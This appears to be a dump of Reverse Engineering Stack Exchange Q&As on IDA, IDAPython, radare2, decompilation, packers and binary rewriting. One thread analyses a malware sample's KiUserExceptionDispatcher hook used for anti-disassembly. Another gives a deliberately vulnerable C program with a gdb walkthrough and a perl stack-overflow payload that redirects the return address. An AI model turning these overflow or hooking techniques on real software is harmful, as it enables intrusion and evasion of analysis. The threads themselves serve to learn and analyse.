{
    var sw = new StreamWriter(File.Open(filename + ""status.txt"", FileMode.Create, FileAccess.Write, FileShare.ReadWrite));

    byte[] data = File.ReadAllBytes(filename);

    if (data.Length == 0) return;

    int dl = dcode.Length;
    for(int loc = 0; loc &lt; (data.Length - (dcode.Length*4)); loc++)     
    {
        for(int off = 0; off &lt; (dcode.Length-1); off++)
        {
            int t1 = dcode[off];
            int t2 = dcode[off + 1];
            int d1 = (t2 - t1)/8;
            int v1 = (int)ReadUint32(data, loc + ((off + 0) * 4));
            int v2 = (int)ReadUint32(data, loc + ((off + 1) * 4));

            int d2 = v2 - v1; 

            if( d1 != d2 )
                break;

            if( off == (dcode.Length-2))
            {                            
                sw.WriteLine(""Match at {0:X8}"",  loc);
                Console.WriteLine(""Match at {0:X8}"",  loc);
            }
        }

    }

    sw.Close();
    sw.Dispose();
}
</code></pre>

<p>which I used like</p>

<pre><code>SearchDumpsForIntDiff(@""Nikon\D7000Update\b750103a.bin"", 0x79DF9A, 0x79DFB2, 0x79DFBA, 0x79DFC2);
</code></pre>
","4672"
"KiUserExceptionDispatcher hook","745","","<p>i am analyzing a piece of malware in which first the address to ""KiUserExceptionDispatcher"" is obtained(using the Export Name Table, going to Export Ordinal Table and then finally to Export Address Table). Once the address(7773A408) is received, the malware overwrites the first 6 bytes with the following lines :</p>

<pre><code>      (here is the finding part)
                ...
   mov BYTE PTR DS:[EDX], 68             -&gt; EDX contains ntdll.KiUserExceptionDispatcher
   mov DWORD PTR DS:[EDX+1], malware.004035C2
   mov BYTE PTR DS:[EDX+5], 0C3
   ....
</code></pre>

<p>So, the hex window at 7773A408 (address of KiUserExceptionDispatcher) changes in the following way:</p>

<pre><code>  7773A408   FC 8B 4C 24 | 04 8B .... (and so on)    &lt;- original

  7773A408   68 C2 35 40 | 00 C3 .....(and so on)    &lt;- after overwriting
</code></pre>

<p>So, what happens then is that the malware reaches a ""UD2"" instruction. I looked it up: it raises an invalid opcode exception. 
Then the malware jumps to </p>

<pre><code> 7773A40D   RETN    
</code></pre>

<p>which then leads me to:</p>

<pre><code>004035C2  DB 8B     &lt;- clear, because 004035C2 starts at 7773A40D (hex window)
</code></pre>

<p>and then finally to another place where a whole new function begins.
So, my question would be: Is it right to assume that the malware tries to change exception handler by overwriting it with 004035C2 to redirect the excetion flow? Why is the exception handler of UD2 the first 6 bytes of KiUserExceptionDispatcher? </p>

<p>best regards,</p>
","<p>The malware overwrites the usermode exception dispatcher (<code>KiUserExceptionDispatcher()</code>) with the following:</p>

<pre><code>PUSH malware.004035C2
RETN
</code></pre>

<p>The code above is equivalent to <code>JMP malware.004035C2</code>.</p>

<p>Now whenever any usermode exception occurs in the process, the function at <code>malware.004035C2</code> will be executed instead of (or at least before) the registered <a href=""http://en.wikipedia.org/wiki/Microsoft-specific_exception_handling_mechanisms#Structured_Exception_Handling"" rel=""nofollow"">SEH</a> functions.</p>

<p>The malware likely uses this ""trick"" in combination with the <code>UD2</code> instruction in order to confuse disassemblers, since most disassemblers won't automatically figure out that the <code>UD2</code> instruction now effectively jumps to <code>malware.004035C2</code>. This type of obfuscation trick is often used to make automated static analysis of code-flow more difficult.</p>
","8811"
"Becoming A Better Reverse Engineer","743","","<p>I have been looking on the net and all I see when it comes to reverse engineering are a bunch of silly crackme tutorials. I want to be better at taking code from assembly to c or c++. I am getting the feeling that I am going to have to have to pick this all in time and or make a bunch of small programs and break them apart.I would like to build on what might be already out there. I am already some what proficient in what I am doing just I want to be better.</p>

<p>For example:</p>

<pre><code>mov     eax, DDrawPtr
push    8
push    1E0h
push    280h
mov     ecx, [eax]
push    eax
call    dword ptr [ecx+54h]
</code></pre>

<p>Hex-rays translates this as </p>

<pre><code>v1 = (*(**DDrawPtr + 0x54))(*DDrawPtr, 640, 480, 8)
</code></pre>

<p>which is ok.... It should be .</p>

<pre><code>HANDLE v1 = DDrawPtr -&gt; SetDisplayMode(640,480,8);
</code></pre>

<p>or sometimes IDA makes mistakes and will say</p>

<pre><code>int __cdecl sub_41B869()
</code></pre>

<p>Where as this code doesn't return anything and is supposed to be a void....</p>

<p>I found a neat question and answer here <a href=""https://reverseengineering.stackexchange.com/questions/2096/convert-this-x86-asm-to-c"">Stackoverflow question/answer</a>.
I am wanting to learn more like this because I am realizing that IDA makes mistakes. I want to know how to recognize function types and more importantly do this by hand, because I am seeing IDA make mistakes and I feel that I should learn to recognize better these mistakes and see how I can manually if need bring it back.</p>

<p>Here is a book that does this somewhat but it goes from C to assembly not the other way around. <a href=""http://beginners.re/RE_for_beginners-en.pdf"" rel=""nofollow noreferrer"">reverse engineering pdf</a></p>

<p>Any suggestions?</p>
","<p>These suggestions may help.  One sure way of becoming a better reverse engineer is to become a better ""forward engineer""!  Here's what I would suggest:</p>

<ol>
<li><strong>Examine the assembly output of various compilers.</strong>  Write test programs of increasing complexity and examine the assembly language output so that you get a sense of what the compiler does for any given high level construct.</li>
<li><strong>Try running binaries through a decompiler.</strong> This will allow you to see how those same programs are interpreted by a tool and allow you to begin to see the kinds of errors that the tools make.</li>
<li><strong>Try completely reverse engineering a small project.</strong> It's not hard to find source code for all kinds of things these days.  Pick an open source project that you are <em>not</em> familiar with, compile it without peeking at the code and try to reverse engineer it entirely.  Alternatively, try reverse engineering some particular routine or aspect (which is more usual).</li>
<li><strong>Try to write code to fool the decompiler.</strong> Open source projects typically don't take any anti-disassembly measures but other kinds of software (e.g. malware) often does.  Learn these techniques in the forward direction and then look at the results with your reverse engineering tools.  You'll get a feel for which techniques are successful and why.</li>
</ol>

<p>Hope that helps.</p>
","6877"
"Writing an exploit for sample-application","743","","<p>I understand the principles of exploiting a classical stack-based buffer-overflow, and now I want to practice it. Therefore I wrote the following test-application:</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;

void public(char *args) {
    char buff[12];
    memset(buff, 'B', sizeof(buff));

    strcpy(buff, args);
    printf(""\nbuff: [%s] (%p)(%d)\n\n"", &amp;buff, buff, sizeof(buff));
}

void secret(void) {
    printf(""SECRET\n"");
    exit(0);
}

int main(int argc, char *argv[]) {
    int uid;
    uid = getuid();

    // Only when the user is root
    if (uid == 0)
        secret();

    if (argc &gt; 1) {
        public(argv[1]);
    }
    else
        printf(""Kein Argument!\n"");
}
</code></pre>

<p>When the user which starts the program is <em>root</em>, the method <code>secret()</code> is being called, <em>otherwise</em>, the method <code>public(...)</code> is being called.
I am using debian-gnome x64, so I had to compile it specifically to x86 to get x86-assembly (which I know better than x64).
I compiled the program with gcc: <code>gcc ret.c -o ret -m32 -g -fno-stack-protector</code></p>

<hr>

<p><strong>Target:</strong>
I want to call the method <code>secret()</code> without being a <em>root-user</em>. <em>{To do that I have to overwrite the <code>R</code>eturn <code>I</code>nstruction <code>P</code>ointer (<code>RIP</code>) with the address of the function <code>secret()</code>}</em></p>

<p><strong>Vulnerability:</strong>
The method <code>public(...)</code> copies the program-args with the unsafe <code>strcpy()</code> method into the <code>char-array</code> <strong>buff</strong>. So it is possible to overwrite data on the stack, when the user starts the program with an <em>arg > 11</em>, where <em>arg</em> should be the length of the string-arg.</p>

<p><strong>Required Information:</strong></p>

<ul>
<li>The address of the function <code>secret()</code>.</li>
<li>The address of the first buffer's first element. Due to <code>ASCII</code>-Encoding I know that each <code>char</code> has a size of <code>1 byte</code>, so that the buffer's last element is <code>12 bytes</code> ahead the first element.</li>
<li>The address of the <code>RIP</code>, because I have to overwrite it <code>secret()</code>s address.</li>
<li><em>OPTIONAL: It also helps to know the address of the <code>S</code>afed <code>F</code>rame <code>P</code>ointer (<code>SFP</code>).</em></li>
</ul>

<p><strong>Methodical approach:</strong></p>

<ul>
<li>Load the program into <code>gdb</code>: <code>gdb -q ret</code>.</li>
<li>To get an overview of the full stack-frame of the method <code>public(...)</code> I have to set a breakpoint there, where the <code>function-epilogue</code> starts. This is at the enclosing brace <code>}</code> at line <code>11</code>.</li>
<li>Now I have to run the program with a valid arg: <code>run A</code>.</li>
<li><p>At the breakpoint, I now want to view the stack-frame.</p>

<pre><code>(gdb) info frame 0
Stack frame at 0xffffd2f0:
 eip = 0x804852d in public (ret.c:11); saved eip = 0x804858c
 called by frame at 0xffffd330
 source language c.
 Arglist at 0xffffd2e8, args: args=0xffffd575 ""A""
 Locals at 0xffffd2e8, Previous frame's sp is 0xffffd2f0
 Saved registers:
  ebp at 0xffffd2e8, eip at 0xffffd2ec
</code></pre>

<p>Because from that I can gather the following information:</p>

<ul>
<li>The <code>RIP</code> is located at <code>0xffffd2ec</code> and contains the address <code>0x804858c</code> which contains the instruction <code>0x804858c &lt;main+61&gt;: add    $0x10,%esp</code>.</li>
<li>The <code>SFP</code> is located at <code>0xffffd2e8</code>.</li>
<li><p>Now I need the address, where the <code>secret()</code>-function starts:</p>

<p>(gdb) print secret
$2 = {void (void)} 0x804852f </p></li>
</ul></li>
<li><p>Last, but not least I get the buffer's address:</p>

<pre><code>(gdb) print/x &amp;buff
$4 = 0xffffd2d4
</code></pre></li>
<li><p>To sum it up:</p>

<ul>
<li><code>RIP</code> is at <code>0xffffd2ec</code>.</li>
<li><code>SFP</code> is at <code>0xffffd2e8</code>.</li>
<li><code>buff</code> is at <code>0xffffd2d4</code>.</li>
</ul></li>
</ul>

<p>This means that I would have to run the program with <code>0xffffd2ec</code> - <code>0xffffd2d4</code> + <code>0x04</code> = <code>28 bytes</code> (= <code>char</code>s).</p>

<p>So, to exploit it I'd have to run the program with an arg which is <code>28 bytes</code> long whereas the last <code>4 bytes</code> contain the address of the function <code>secret()</code> (and pay attention to little-endian-ordering):</p>

<pre><code>(gdb) run `perl -e '{print ""A""x24; print ""\xec\d2\ff\ff""; }'`
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/patrick/Projekte/C/I. Stack_Overflow/ret `perl -e '{print ""A""x24; print ""\xec\d2\ff\ff""; }'`

buff: [AAAAAAAAAAAAAAAAAAAAAAAA�d2
                                  f
                                   f] (0xffffd2b4)(12)


Program received signal SIGSEGV, Segmentation fault.
0x0c3264ec in ?? ()
</code></pre>

<p>Two questions are rising up:</p>

<ul>
<li><p>Why is it not working. This example is basically from an older book I'm reading. But theoretically it should work so I think....</p></li>
<li><p>Why is between <code>buff</code> and the <code>SFP</code> a <code>8-byte</code> gap? What does this memory-area contain?</p></li>
</ul>

<p><strong>EDIT: <a href=""https://drive.google.com/file/d/0BxV4F9km7MRVa0RKOGk5T3c2UVE/view?usp=sharing"" rel=""nofollow"">That's</a> a download-link to the binary.</strong></p>
","<blockquote>
  <ul>
  <li>Why is it not working. This example is basically from an older book I'm reading. But theoretically it should work so I think....</li>
  </ul>
</blockquote>

<p>It's because you're overwriting the return address on the stack with <code>0xffffd2ec</code> instead of <code>0x0804852f</code> (the latter is the address for <code>secret()</code>).</p>

<p>If you thus use <code>'{print ""A""x24; print ""\x2f\85\04\08""; }'</code> instead, it should work.</p>

<blockquote>
  <ul>
  <li>Why is between <code>buff</code> and the <code>SFP</code> a <code>8-byte</code> gap? What does this memory-area contain?</li>
  </ul>
</blockquote>

<p>That gap is probably because of attempted optimizations made by gcc. The memory-area contains nothing (well, technically it contains 8 bytes whose values are indeterminate) and the code in the <code>public()</code> function neither reads from nor writes to that memory-area.</p>
","11021"
"Is it possible to force IDA to acknowledge unusual frame pointer deltas?","740","","<p>I keep coming across a compiling pattern that IDA doesn't automatically handle well.  Consider the following example:</p>

<pre><code>mov rax, rsp       ; Set rax at the start of the function
...
lea rbp, [rax-5Fh] ; Shortly afterward, set rbp as the frame pointer at a nonstandard offset
...
mov [rbp+3Fh], rcx ; Reference all stack offsets from rbp for the rest of the function
...
</code></pre>

<p>In this example, it appears that IDA has lost track of <code>rbp</code>'s state as an offset into the stack frame, presumably because of the additional indirection.  (We copy from <code>rsp</code> to <code>rax</code> to <code>rbp</code>, rather than just from <code>rsp</code> to <code>rbp</code>)</p>

<p>I would like the above example to look something more like this:</p>

<pre><code>var_20= qword ptr -20h
...
mov [rbp+5Fh+var_20], rcx
</code></pre>

<p>However, as one would expect, if I change the type of <code>3Fh</code> to be a stack offset, I get the following:</p>

<pre><code>arg_37= qword ptr 3Fh
...
mov [rbp+arg_37], rcx
</code></pre>

<p>Which is obviously not correct.  I have two questions:</p>

<ul>
<li><strong>Is it possible to generate the desired output?</strong></li>
<li><strong>If not, how would one normally deal with this?</strong></li>
</ul>

<p>Solutions I am aware of:</p>

<ul>
<li>I could create a structure for the stack frame and specify the offset delta (occasionally also adjusting for <a href=""http://www.hexblog.com/?p=63"">negative offsets</a>).  The downsides are that I would have to create a structure for each stack frame I analyze, and I would also not have cross-references.</li>
<li>I could just use the incorrect offsets in the stack frame.  This would give me cross-references, but I would expect things to break when touching <code>r</code>, the offset storing the return address.</li>
</ul>

<p>Also relevant: I'm using IDA Pro 6.2.</p>
","<p><code>Alt+P</code> will bring up the <code>Edit function</code> screen.</p>

<p>Make sure <code>BP based frame</code> is checked, and enter your value <code>0x5F</code> into the box marked <code>Frame pointer delta</code>.</p>
","6523"
"Colorize and disassemble byte sequences with IDA Pro and IDAPython","739","","<p>Maybe someone could help me with the following problem:</p>

<p>I have an interesting byte sequence that I found within a MIPS ELF binary that exists on the hard drive. This byte sequence may be, for example, <code>9c 6c 3c 04 80 2d 24 84 85</code>. Now I want to find this byte sequence with IDAPython. Therefore, I use the <code>idc.FindBinary()</code> function like so:</p>

<pre><code>address = idc.FindBinary(0, SEARCH_DOWN, byte_sequence)
</code></pre>

<p>which finds the first occurrence of the byte sequence at <code>address</code>. In general I want to achieve two things:</p>

<ol>
<li><p>I want to colorize the effected affected lines in the IDA View</p></li>
<li><p>I want to get the disassembled instructions</p></li>
</ol>

<p>Currently there are two subproblems I want to solve:</p>

<ol>
<li><p>The byte sequence may start <strong>within</strong> the instruction, for example, in a <code>jal address</code> the byte sequence starts at <code>address</code> instead of at <code>jal</code>. <strong>How can I search backwards to find the beginning of the instruction when the byte sequence started within the instruction?</strong> Colorizing works with:</p>

<pre><code>SetColor(address, CIC_ITEM, 0x208020)
</code></pre></li>
<li><p>If the byte sequence is 9 bytes long (as in the example above), <strong>how can I tell IDAPython to disassemble all 9 bytes</strong>. I would have to know how ""long"" the instructions are that IDAPython disassembles to get to the next instruction. What I know is that I can disassemble at a single addresses with:</p>

<pre><code>disasm = idc.GetDisasm(address)
</code></pre></li>
</ol>

<p>Any help would be greatly appreciated!</p>
","<p>You can easily do that using Sark:</p>

<pre><code># Get all the lines relevant to your bytes
for line in sark.lines(start=address, end=address + len(byte_sequence)):
    # For each line, color it, and print the disasm and the instruction length
    line.color = 0x123456
    print 'Line Size: {}\nLine Disasm: {}'.format(line.size, line.disasm)
</code></pre>

<p>You might need to add handling for cases where there is no disassembly (the bytes are data-bytes and not code).</p>
","11351"
"Calling functions from IDAPython","736","","<p>I wrote a script containing several functions, which I loaded in IDA pro. From IDAPython now I'd want to call a specific function. Is it possible? Which idaapi functions should I use to call my functions in the script?</p>

<p>EDIT:
I am running IDA on a linux system and the script has been written in python.</p>
","<p>You have 3 alternatives:</p>

<ol>
<li><p>You can just run the function by its name. If you already ran your script, defined functions should remain in the Python interpreter context.</p></li>
<li><p>You can add the path of your script to sys.path and import the script again. It should looks as follows:</p>

<pre><code>import sys

sys.path.append(""path to your folder with the script"")

import your_script_name
</code></pre></li>
<li><p>You can add this (addition to sys.path and import) into file <code>idapythonrc.py</code> in the root of IDA installation and this script will be imported each time you running IDA.</p></li>
</ol>
","8820"
"Custom UI buttons","736","","<p>I just started using IDA and OllyDbg, although I am experienced developer but before this I was reverse engineering only Java and .Net code which is much more easy task comparing of what I need to do now.</p>

<p>I have an application which has some buttons that are not accessible by Spy++ and WinInspector and all other tools that I tried. Spy++ sees only the <code>selectorclass</code> which is the whole panel where buttons are placed. I've managed to find where the <code>WndProc</code> of this selector is and even the method wich takes hwnd of <code>SelectorControl</code> from <code>GetPropA</code> method, but I have trouble identifying the click itself, so i don't know where the actual button is clicked and where there the app knows what exact button is clicked and what handler to use. </p>

<p>I would like to ask for some tips which are maybe useful to know but are not known by newbies like me. What are strategies that can be used here?</p>

<p>Maybe there are some ways to identify what framework was used, so I can play with that framework to know what to look for.</p>
","<p>If the surrounding window seems to be a genuine window, but the individual buttons are not, I'd assume that</p>

<ul>
<li>The surrounding window displays a bitmap, or does whatever else is needed to display the individual buttons</li>
<li>The surrounding window reacts on mouse clicks</li>
<li>And, the surrounding window determines itself which ""button"" is used by looking at the mouse coordinates at the time of the mouse click.</li>
</ul>

<p>So, what we want to do is, start the program in a debugger, and use a breakpoint that is triggered when the mouse click occurs. The problem is, the window procedure gets called a lot of times, with all kind of messages, while you want to break on some of them (for example, <code>WM_LBUTTONDOWN</code>), but not on most of the others (for example, <code>WM_PAINT</code>).</p>

<ul>
<li>Ollydbg can do this directly - place a conditional breakpoint that triggers depending on the window message.</li>
<li>If, for whatever reason, you can't use that feature, you need to disassemble (and partially understand) the window procedure. It will receive 4 parameters on the stack, the 2nd of which is the window message (see <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms633570%28v=vs.85%29.aspx"" rel=""nofollow"">Using Window Procedures</a>). The window procedure will, at some point, compare this parameter to the values of well-known window message IDs. You might be interested in <code>WM_LBUTTONDOWN</code> (<code>0x0201</code>) or one of the other <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms645533%28v=vs.85%29.aspx"" rel=""nofollow"">Mouse Input Events</a>). Check where the code branches to when it receives one of those ""interesting"" messages, and place a breakpoint on that branch.</li>
</ul>

<p>After placing a suitable breakpoint, run your application in the debugger, click the mouse, and hope the debugger actually hits the breakpoint. If it doesn't, check which mistake you've made.</p>

<p>Single-Step your code. It will probably fetch parameter 4 from the stack, which encodes the X and Y coordinates of the mouse, and compare these parameters to something - chances are, there's an array of structures that defines rectangles and jump addresses, and a loop that checks against each entry.</p>

<p>Once you've found that, you're finished.</p>

<p>Sounds too easy? It probably is, because, depending on your framework, the actual comparisons might be buried deeply in stuff that was a bunch of C++ classes in the original source, and there might be various calls, some of them indirect (in the case of C++ class methods) until you get to the ""interesting"" position.</p>

<ul>
<li><p>Sometimes it's easier to use Ollydbg to resolve this. Single-Step the source after your breakpoint, using ""step over"" to step over function calls. Whenever you see something interested happened within the function call, note the address. Restart your program, run to your breakpoint, run to the address you noted, and ""step into"" the function this time. This will allow you to put the finger on the interesting code relatively quickly, while stepping over all the <code>strcmp()</code> and <code>malloc()</code> and <code>WriteALotOfStuffToSomeFileIfDebuggingIsOn()</code> functions.</p></li>
<li><p>Sometimes it's easier to use IDA. Generate a call tree from your window procedure, focus on the first 3-5 levels. Search your code for occurrences of magic numbers, like the <code>0x0201</code> above. Check if one of these is a <code>CMP XX, 0x0201</code> in one of the functions in your call tree. This might be just the position you're looking for.</p></li>
<li><p>Make a screen shot, and paste it into some image viewer program (I like <code>Irfanview</code> for that). Get the pixel coordinates of the button within the frame window. Search, in the data section, for those values, surrounded by what looks like a table of similar data. This might be your coordinate/jump table. If you find something, place a hardware breakpoint on it to find out when that memory gets accessed, or use the IDA cross reference list to get respective addresses in your code.</p></li>
</ul>
","4725"
"Disassemble using an emulator","736","","<p>I learned the disassembly challenges from <a href=""https://www.usenix.org/legacy/event/usenix03/tech/full_papers/prasad/prasad_html/node5.html"" rel=""nofollow"">this link</a>. The following six challenges are listed in that article:</p>

<ol>
<li>Data embedded in the code regions</li>
<li>Variable instruction size</li>
<li>Indirect branch instructions</li>
<li>Functions without explicit CALL sites within the executable's code segment</li>
<li>Position independent code (PIC) sequences</li>
<li>Hand crafted assembly code.</li>
</ol>

<p>However, I am thinking about the following disassembly method which seems to solve the above challenges. Assuming we have an executable to be disassembled, an input set that can has 100% coverage of the code, and an emulator (e.g. QEMU). Then, we can instrument the emulator to output each instruction executed by the emulated CPU and the corresponding memory address. After that, we can translate each instruction to assembly instruction, and the whole program is now disassembled. </p>

<p>Could you please tell me why this idea will not/will work?</p>
","<blockquote>
  <p>an input set that can has 100% coverage of the code</p>
</blockquote>

<p>This may be <em>very</em> difficult to achieve, especially if the code behavior depends on something that you don't directly control (time, memory, OS version/environment, random number generator etc.). Additional observations:</p>

<ol>
<li>actually executing all that code may take more time than you can afford</li>
<li>executing some parts of the code may require conditions you cannot satisfy (e.g. a specific hardware peripheral)</li>
<li>you will miss code which is present in binary but never executes (dead code). In some cases such code can reveal additional information about the binary</li>
<li>your approach may discover all code, but it will likely miss a lot of <em>data</em>.</li>
</ol>

<p>However, it does not mean that the approach is completely useless. In fact there's already been some work in this area. For example, check out the S2E (Selective Symbolic Execution) project:</p>

<p><a href=""https://sites.google.com/site/dslabepfl/proj/s2e"">https://sites.google.com/site/dslabepfl/proj/s2e</a></p>

<blockquote>
  <p>Conceptually, S2E is an automated path explorer with modular path analyzers: the explorer drives the target system down all execution paths of interest, while analyzers check properties of each such path (e.g., to look for bugs) or simply collect information (e.g., count page faults). Desired paths can be specified in multiple ways, and one can either combine existing analyzers to build a custom analysis tool, or write new analyzers using the S2E API.</p>
  
  <p>S2E helps make analyses based on symbolic execution practical for large software that runs in real environments, without requiring explicit modeling of these environments.</p>
</blockquote>
","5828"
"Is there a perfect method for protecting executable files?","736","","<p>I tried UPX, ASPack and other protectors, but it seems that my application has a weak protection.</p>

<p>What is the best method for protecting your program? Using packers or something else?</p>

<p>At least for a beginner; because I guess there is no perfect protection in the planet an expert can't reverse.</p>
","<p>No there is not. You can make it harder to reverse engineer, but there's nothing you can realistically do to make it impossible, if there's enough incentive to reverse engineer your application. Professional malware researchers routinely reverse engineer much tougher stuff then anything you'll find publicly.</p>

<p>Theoretically, it may be possible using fully homomorphic encryption, but the practical difficulties make it impossible and undesirable in practice, even if it's theoretically possible.</p>

<p>As for the best method of protection, I'd say just remove the incentive to reverse engineer it in the first place. I'd be more specific but it's not clear what kind of attacker you're trying to protect against.</p>
","3051"
"Are there any static binary rewriting tools？","735","","<p>My goal is to modify some instructions and make some instrumentation in ELF executables or libraries(For example, modifying all memory writes instructions). Since there're so many instructions, I want to find them automatically and apply some modification. Are there any tools that I can leverage?</p>
","<p>I just extracted the following list during my research of this paper:</p>

<blockquote>
  <p><strong>""Reassembleable Disassembling""</strong> Shuai Wang, Pei Wang, and Dinghao Wu,
  The Pennsylvania State University</p>
</blockquote>

<p>The following list consits of all mentioned tools (dynamic and static), perhaps there is something useful:</p>

<hr>

<p><strong>UROBOROS</strong> <em>(Static, x86/x64 ELF)</em></p>

<p>So the paper itself introduces UROBOROS. I think it's one of the best options for you:</p>

<p><a href=""https://github.com/s3team/uroboros"" rel=""nofollow noreferrer"">https://github.com/s3team/uroboros</a></p>

<blockquote>
  <p><strong>""Reassembleable Disassembling""</strong> Shuai Wang, Pei Wang, and Dinghao Wu,
  The Pennsylvania State University</p>
  
  <p>In this paper, we present UROBOROS, a tool that can disassemble
  executables to the extent that the gener- ated code can be assembled
  back to working binaries without manual effort. [...] </p>
  
  <p>We have implemented a prototype of UROBOROS in OCaml and Python, with
  a total of 13,209 lines of code. Our prototype works for both x86 and
  x64 ELF binaries. [...] </p>
  
  <p>We have presented UROBOROS, a tool that can disassem- ble stripped
  binaries and produce reassembleable assem- bly code in a fully
  automated manner. We call this tech- nique reassembleable
  disassembling and have developed a prototype called UROBOROS. Our
  experiments show that reassembled programs incur negligible execution
  overhead, and thus UROBOROS can be potentially used as a foundation
  for binary-based software retrofitting.</p>
</blockquote>

<hr>

<p><strong>Dyninst [10, 20]</strong> <em>(Static+Dynamic)</em></p>

<blockquote>
  <p>BUCK, B., AND HOLLINGSWORTH, J. K. An API for runtime code patching.
  Int. J. High Perform. Comput. Appl. 14, 4 (2000), 317–329.</p>
</blockquote>

<hr>

<p><strong>Vulcan [16]</strong> <em>(Static, binaries compiled by special compilers, not stripped)</em></p>

<blockquote>
  <p>EDWARDS, A., VO, H., SRIVASTAVA, A., AND SRIVASTAVA, A. Vulcan binary
  transformation in a distributed environment. Tech. Rep.
  MSR-TR-2001-50, Microsoft Research, 2001.</p>
</blockquote>

<hr>

<p><strong>Alto [35]</strong> <em>(Static, binaries compiled by special compilers, not stripped)</em></p>

<blockquote>
  <p>MUTH, R., DEBRAY, S. K., WATTERSON, S., AND DE BOSS- CHERE, K. Alto: A
  link-time optimizer for the Compaq Alpha. Softw. Pract. Exper. 31, 1
  (2001), 67–101.</p>
</blockquote>

<hr>

<p><strong>Diablo [13]</strong> <em>(Static, binaries compiled by special compilers, not stripped)</em></p>

<blockquote>
  <p>DE SUTTER, B., DE BUS, B., AND DE BOSSCHERE, K. Link- time binary
  rewriting techniques for program compaction. ACM Trans. Program. Lang.
  Syst. 27, 5 (2005), 882–945.</p>
</blockquote>

<hr>

<p><strong>SecondWrite [3]</strong> <em>(Static)</em></p>

<blockquote>
  <p>ANAND, K., SMITHSON, M., ELWAZEER, K., KOTHA, A., GRUEN, J., GILES,
  N., AND BARUA, R. A compiler-level inter- mediate representation based
  binary analysis and rewriting sys- tem. In Proceedings of the 8th ACM
  European Conference on Computer Systems (2013), ACM, pp. 295–308.</p>
</blockquote>

<hr>

<p><strong>Pin [31]</strong> <em>(Dynamic)</em></p>

<blockquote>
  <p>LUK, C.-K., COHN, R., MUTH, R., PATIL, H., KLAUSER, A., LOWNEY, G.,
  WALLACE, S., REDDI, V. J., AND HAZELWOOD, K. Pin: Building customized
  program analysis tools with dy- namic instrumentation. In Proceedings
  of the 2005 ACM SIG- PLAN Conference on Programming Language Design
  and Im- plementation (2005), ACM, pp. 190–200.</p>
</blockquote>

<hr>

<p><strong>DynamoRIO [7]</strong> <em>(Dynamic)</em></p>

<blockquote>
  <p>BRUENING, D. L. Efficient, transparent, and comprehensive runtime code
  manipulation. PhD thesis, Massachusetts Institute of Technology, 2004.</p>
</blockquote>

<hr>

<p><strong>miasm2</strong></p>

<blockquote>
  <p>Miasm is a free and open source (GPLv2) reverse engineering framework.
  Miasm aims to analyze / modify / generate binary programs.
  <a href=""https://github.com/cea-sec/miasm"" rel=""nofollow noreferrer"">https://github.com/cea-sec/miasm</a></p>
</blockquote>

<hr>

<p><strong>VxStripper</strong> <em>(dynamic)</em></p>

<blockquote>
  <p>Josse, Sébastien. ""Malware Dynamic Recompilation."" System Sciences
  (HICSS), 2014 47th Hawaii International Conference on. IEEE, 2014.</p>
</blockquote>
","14842"
"Why IDA aggressively assumes 'nothing' on segment registers?","732","","<p>I'm disassembling a packed 16 bit DOS MZ EXE.</p>

<p>To deobfuscate it, I've set a breakpoint in DOSbox at the end of the unpacking routine, let it run, and made a memory dump. This way I essentially got the deobfuscated EXE image. Then I loaded this image in IDA.</p>

<p>Obviously, there's no MZ header anymore, so IDA can't know the application's entry point and initial values of CS, SS and other segment registers. I, however, do know these values, and I'm willing to supply them to IDA. To do this, I hit <kbd>Alt</kbd>+<kbd>G</kbd> and type the register's value.</p>

<p>However, instead of showing <code>assume ds:&lt;value&gt;</code>, IDA shows</p>

<pre><code>seg000:1AEBC                     assume es:nothing, ss:nothing, ds:nothing
</code></pre>

<p>Why?</p>

<p>Another question. Why there is no option to set the value of CS register? Consider code which contains near jumps. Without knowledge about the CS register value, IDA won't be able to proceed with disassembling. But I <em>do</em> know what value CS has at this specific point! How do I supply this information to IDA if the <code>Segment Register Value</code> dialog window doesn't have CS option?</p>
","<p>DOS programs used segments and IDA was made to mimic that behavior. That's why you cannot change CS (since in properly set up database CS is just the segment's base) and why your changes to segment registers do now show up (because there is no segment corresponding to the values you enter).</p>

<p>I would suggest opening a normal (not packed) MZ file to see how it's supposed to look. If you keep fighting IDA instead of working with it you'll keep having problems.</p>
","6071"
"Howto setup IDA Pro Dalvik Debugger Process Options to debug APK on a real device","730","","<p>I had some fun using IDA Pro Dalvik Debugger in the past using AVD emulator. 
However I stumbled upon a APK that somehow does not run well inside AVD. APK runs fine on a real device so I am trying to use IDA Pro dalvik debugger to debug the APK on a real device. </p>

<p>The problem is, when using AVD all I had to setup was packagename and activity name in the <code>Debugger Setup -&gt; Set specific options</code> and debugger worked well but trying on a real device keep fails with message like <code>ADB error: listener 'tcp:239166' not found</code> or <code>IDA started the application but unable to connect ..</code> message. </p>

<p>I tried <code>adb forward</code> on a port Dalvik debugger is using but no progress :(</p>

<p>Can anyone provide help? Thanks in advance.</p>
","<p>Setting the target app to <code>debuggable</code> in the android manifest and repackaging the apk has done the job. I didn't know that AVD automatically sets the APK to debuggable. </p>
","13197"
"How to make radare2 work for a large binary?","727","","<p>I compiled <a href=""https://github.com/python/cpython"" rel=""nofollow noreferrer"">cpython</a> with debugging headers and I want to perform the following <a href=""https://reverseengineering.stackexchange.com/questions/16081/how-to-generate-the-call-graph-of-a-binary/16082#16082"">analysis</a> using radare2. </p>

<p>The problem I encounter is that it takes forever (at least 27 hours) to perform the <code>aaa</code> (analysis) part. </p>
","<p>It is not a good practice to run full analysis of your binary at the startup and it also isn't encourged by radare. Running <code>aaa</code> by default is a heavy action and absolutely not recommended or needed in most of the cases.</p>

<p>As stated in <a href=""http://radare.today/posts/analysis-by-default/"" rel=""noreferrer"">this execllent post</a> from radare's blog:  </p>

<blockquote>
  <p>Code analysis is not a quick operation, and not even predictable or taking a linear time to be processed. This makes starting times pretty heavy, compared to just loading the headers and strings information like it’s done by default.<br>
  ...<br>
  We enforce users to think about their workflows in order to better understand the problem they are facing and solve it in an optimal way, saving cpu, memory and why not: cats.</p>
</blockquote>

<p>To make the analysis process more efficient you can start with configuring different analysis configuration variables in radare. These configuration variables can help you to fit the analysis process to your program and to your needs. Some of the interesting variables are:  </p>

<pre><code>anal.afterjmp  
anal.depth  
anal.eobjmp  
anal.esil  
anal.hasnext  
anal.nopskip  
anal.from
anal.to
</code></pre>

<p><em>See the <code>e??anal.</code> command to get more detailed descriptions for them.</em>  </p>

